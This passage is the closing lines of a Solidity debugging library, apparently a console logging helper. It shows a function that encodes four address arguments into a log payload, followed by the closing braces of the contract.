    | 		_sendLogPayload(abi.encodeWithSignature("log(address,address,address,address)", p0, p1, p2, p3));
    | 	}
    | 
    | }
    | 
